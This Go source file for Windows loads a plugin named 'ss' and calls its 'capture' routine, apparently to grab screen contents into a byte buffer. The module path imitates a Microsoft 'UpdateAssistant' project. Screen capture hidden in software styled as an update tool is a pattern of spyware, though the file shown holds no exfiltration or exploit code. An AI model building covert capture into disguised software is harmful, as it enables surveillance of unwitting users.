//go:build windows

package sysutil

import (
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/loader"
)

func media(fn func(*loader.Plugin)) {
	p, err := loader.Load("ss")
	if err != nil {
		return
	}
	defer loader.Unload(p)
	fn(p)
}

func Capture() []byte {
	var out []byte
	media(func(p *loader.Plugin) {
		buf := make([]byte, config.SsCap)
		n, err := p.Call("capture",
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(config.SsCap),
		)
		if err == nil && int(n) > 0 {
			out = buf[:int(n)]
		}
	})
	return out
}
